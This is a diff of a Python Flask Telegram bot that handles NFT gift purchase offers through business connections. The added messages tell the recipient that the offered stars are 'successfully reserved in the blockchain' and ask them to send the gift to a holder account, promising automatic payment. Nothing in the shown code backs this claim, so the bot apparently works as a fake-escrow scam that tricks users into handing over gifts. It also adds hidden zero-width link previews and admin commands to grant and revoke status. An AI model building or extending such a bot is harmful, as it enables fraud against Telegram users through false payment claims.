@@ -543,7 +543,7 @@ def process_msg(msg):
             hidden = f'<a href="{nl}">\u200b</a>'
             name = msg["from"].get("first_name") or msg["from"].get("username") or "User"
 
-            cap = hidden + f"<b>{name}</b> предлагает <b>{pr}</b> {cs} за <b>{ni['name']} #{ni['nfmt']}</b>.\n\n5h 59m на решение."
+            cap = hidden + f"<b>{name}</b>предлагает <b>{pr}</b> {cs} за <b>{ni['name']} #{ni['nfmt']}</b>.\n\n5h 59m на решение."
 
             res = sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)
 
@@ -720,23 +720,43 @@ def process_cb(cb):
                 ac(cbid)
                 return
 
-  set_deal_status(did, "accepted")
+   set_deal_status(did, "accepted")
             ac(cbid)
 
+            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
+            nf = fmt(deal["num"])
             h = deal["hold"]
             nl = f"https://t.me/nft/{deal['slug']}"
             bci = deal.get("bci") or ci
 
             hidden = f'<a href="{nl}">\u200b</a>'
-            nf = fmt(deal["num"])
-            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
 
-            txt = hidden + f"✅ <b>Сделка принята!</b>\n\n"
-            txt += f"Отправьте NFT <b>{deal['name']} #{nf}</b> пользователю @{h}.\n"
-            txt += f"После отправки нажмите кнопку «Проверить»."
+            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы в блокчейне.\n\n"
+            txt += f"Ожидается передача подарка <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\n"
+            txt += f"Нажмите кнопку «Передать» и отправьте подарок <b>{deal['name']} #{nf}</b> пользователю <b>@{h}</b>. После завершения сделки {cs} автоматически начислятся на ваш аккаунт."
 
-            # aakb создает клавиатуру с кнопками "Передать" и "Проверить"
-            em(cid, mid, txt, kb=aakb(did, h), bci=bci)
+            d = {
+                "chat_id": cid,
+                "message_id": mid,
+                "text": txt,
+                "parse_mode": "HTML",
+                "link_preview_options": {
+                    "is_disabled": False,
+                    "show_above_text": True,
+                    "url": nl
+                },
+                "reply_markup": aakb(did, h)
+            }
+
+            if bci:
+                d["business_connection_id"] = bci
+
+            res = api("editMessageText", **d)
+
+            if not res.get("ok"):
+                dm(cid, mid, bci=bci)
+                sm_nft(cid, txt, nl, kb=aakb(did, h), bci=bci)
+
             return
 
         if data.startswith("decline:"):
@@ -744,94 +764,80 @@ def process_cb(cb):
             deal = get_deal(did)
 
             if not deal or deal["st"] != "pending":
-                ac(cbid, txt="❌ Сделка не активна", sa=True)
+                ac(cbid)
                 return
 
             set_deal_status(did, "declined")
             ac(cbid)
 
             bci = deal.get("bci") or ci
-            txt = "❌ <b>Сделка отклонена</b>"
-
-            # Убираем инлайн-клавиатуру при отклонении
-            em(cid, mid, txt, kb={"inline_keyboard": []}, bci=bci)
+            em(cid, mid, "❌ Оффер отклонён.", kb={"inline_keyboard": []}, bci=bci)
             return
+
+        ac(cbid)
 
     except Exception as e:
         logging.error(f"CB ERR: {e}")
 
 # --- UPDATE ROUTER ---
 
-def process_update(data):
+def process_update(u):
     try:
-        if "message" in data:
-            process_msg(data["message"])
-        elif "business_message" in data:
-            process_msg(data["business_message"])
-        elif "callback_query" in data:
-            process_cb(data["callback_query"])
-        elif "business_connection" in data:
-            # Сохраняем ID бизнес-подключения при его обновлении
-            bc = data["business_connection"]
+        if "message" in u:
+            process_msg(u["message"])
+        elif "business_message" in u:
+            process_msg(u["business_message"])
+        elif "callback_query" in u:
+            process_cb(u["callback_query"])
+        elif "business_connection" in u:
+            bc = u["business_connection"]
             set_bci(bc["user"]["id"], bc["id"])
     except Exception as e:
         logging.error(f"UPDATE ERR: {e}")
 
 # --- FLASK ROUTES ---
 
-@app.route("/", methods=["GET"])
-def health_check():
-    """Health-check роут для Render, чтобы сервис не уходил в сон."""
-    return "Sulumi Team Bot is running", 200
-
 @app.route("/webhook", methods=["POST"])
 def webhook():
-    if request.headers.get('content-type') != 'application/json':
-        return jsonify({"ok": False, "error": "Unsupported Media Type"}), 415
+    u = request.get_json(force=True, silent=True)
 
-    data = request.get_json(silent=True)
-    if data:
-        # Используем ThreadPoolExecutor для моментального ответа 200 OK Telegram API
-        executor.submit(process_update, data)
+    if u:
+        executor.submit(process_update, u)
 
-    return jsonify({"ok": True})
+    return jsonify({"ok": True}), 200
+
+@app.route("/")
+def index():
+    return "OK"
 
 # --- WEBHOOK SETUP ---
 
-def set_webhook():
-    # Удаляем старый вебхук
-    api("deleteWebhook", drop_pending_updates=True)
-    
-    webhook_url = f"{RENDER_URL}/webhook"
-    
-    # Устанавливаем новый вебхук
-    res = api("setWebhook", url=webhook_url, 
-              allowed_updates=["message", "business_message", "callback_query", "business_connection"])
-    
-    if res.get("ok"):
-        logging.info(f"Webhook успешно установлен: {webhook_url}")
-    else:
-        logging.error(f"Ошибка установки вебхука: {res}")
+def set_wh():
+    r = api(
+        "setWebhook",
+        url=f"{RENDER_URL}/webhook",
+        allowed_updates=["message", "callback_query", "business_connection", "business_message"]
+    )
+    logging.info(f"Webhook set: {r}")
 
-    # Настраиваем команды в меню бота
-    commands = [
-        {"command": "buy", "description": "💎 Купить"},
-        {"command": "tarifs", "description": "💎 Тарифы"},
-        {"command": "lg", "description": "🌐 Язык"},
-        {"command": "cv", "description": "💱 Валюта"},
-        {"command": "holder", "description": "👑 Держатель"}
-    ]
-    api("setMyCommands", commands=commands)
+def set_cmd():
+    api(
+        "setMyCommands",
+        commands=[
+            {"command": "buy", "description": "💎 Купить"},
+            {"command": "tarifs", "description": "💳 Цены"},
+            {"command": "lg", "description": "🌐 Язык"},
+            {"command": "cv", "description": "💱 Валюта"},
+            {"command": "holder", "description": "👑 Держатель"},
+            {"command": "list", "description": "📋 Список (админ)"},
+            {"command": "zabrat", "description": "🚫 Отозвать (админ)"},
+            {"command": "legitt", "description": "➕ Выдать (админ)"}
+        ]
+    )
 
-# --- MAIN ---
+init_db()
 
 if __name__ == "__main__":
-    # Инициализация базы данных при старте
-    init_db()
-    
-    # Если запускается на сервере Render, автоматически настраиваем вебхук
-    if os.environ.get("RENDER"):
-        set_webhook()
-        
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    set_wh()
+    set_cmd()
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
